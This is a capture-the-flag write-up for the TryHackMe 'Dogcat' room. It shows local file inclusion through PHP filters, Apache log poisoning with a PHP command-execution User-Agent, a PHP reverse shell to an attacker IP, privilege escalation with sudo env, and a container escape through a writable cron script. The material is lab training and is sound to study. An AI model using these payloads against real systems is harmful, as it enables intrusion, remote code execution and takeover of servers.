# 40 - Dogcat (LFI exploit via Log Poisoning)

Room Link --> [https://tryhackme.com/room/dogcat](https://tryhackme.com/room/dogcat)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.78.180 -sV -p-
```
{% endcode %}

The webpage is vulnerable to LFi, after trying different payloads to view the /etc/passwd but to no avail. Then i tried to use php:filters to read the sourcecode file and it worked.

We can find some filters in payloadallthethings

<figure><img src=".gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://10.10.78.180/?view=php://filter/convert.base64-encode/resource=dog

# output
Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K

# decoding the b64 and got:
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```
{% endcode %}

To view the page source code:

{% code overflow="wrap" lineNumbers="true" %}
```
http://10.10.78.180/?view=php://filter/convert.base64-encode/resource=dog/../index
```
{% endcode %}

<figure><img src=".gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

Decoding the file

{% code overflow="wrap" lineNumbers="true" %}
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
{% endcode %}

```
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```

In line `20` we can see that the function adds a .php extension at the end of the URL so if we provide it with the ‘dog’  keyword it will convert it to dog.php and when we were giving it /etc/password it was converting it into /etc/passwd.php, Hence we need to escape this function to read files of our choice. And it also checks that the `view` parameter must contain either dog or cat, ie; `?view=dog` or `?view=cat` .

To escape this filter we must add the parameter `ext` to our query, ie `?view=dog/../../../etc/passwd&ext`  to read this file.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://10.10.78.180/?view=dog/../../../../../etc/passwd&ext
```
{% endcode %}

<figure><img src=".gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

### Exploitation

We check if we can view the apache log files.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://10.10.78.180/?view=dog/../../../../../var/log/apache2/access.log&ext

# and we can.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

### LFI Log Poisoning

I did a similar room with same LFI Log Poisoning exploitation [here](https://app.gitbook.com/o/HwGCj90ins0aZjh3wkjn/s/NujiiNqi7l7dVfQfwlOJ/\~/changes/96/19-archangel-lfi-exploit-via-log-poisoning).&#x20;

Using Curl

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl "http://10.10.0.91/?view=dog/../../../../../var/log/apache2/access.log&ext" -H 'User-Agent: <?php system($_GET['cmd']); ?>'

# now we can execute cmds.
http://10.10.0.91/?view=dog/../../../../var/log/apache2/access.log&ext&cmd=id
```
{% endcode %}

<figure><img src=".gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

### Initial Access

#### Gaining Rev Shell

Pick a php one liner reverse shell code and urlencode it then pass it as cmd.

{% code overflow="wrap" lineNumbers="true" %}
```php
php -r '$sock=fsockopen("10.18.88.214",4242);exec("/bin/sh -i <&3 >&3 2>&3");'

# url encoded
php%20-r%20%27%24sock%3Dfsockopen%28%2210.18.88.214%22%2C4242%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27


# execution
http://10.10.0.91/?view=dog/../../../../var/log/apache2/access.log&ext&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.18.88.214%22%2C4242%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```
{% endcode %}

And i got a shell.

<figure><img src=".gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

`sudo -l`

<figure><img src=".gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

We can execute `/bin/env` with sudo privs.

checking gtfobins for the binary `env`

`sudo env /bin/sh` - gives us root.

<figure><img src=".gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Flag 2 was in `/var/www`  dir

Flag 3 `/root` dir.

Flag 4;

In the root directory we see a `.dockerenv` file which tells us we are in a docker env, so we need to break out.

Looking in the `/opt` dir there are 2 files.

{% code overflow="wrap" %}
```bash
backup.sh
backup.tar

# content of the backup.sh
root@10cd6cf04cdb:/opt/backups# cat backup.sh
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```
{% endcode %}

### Breaking out of the Container

So the script basically backs up the /root/container to the backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.

And after some seconds we got a shell.

Done.
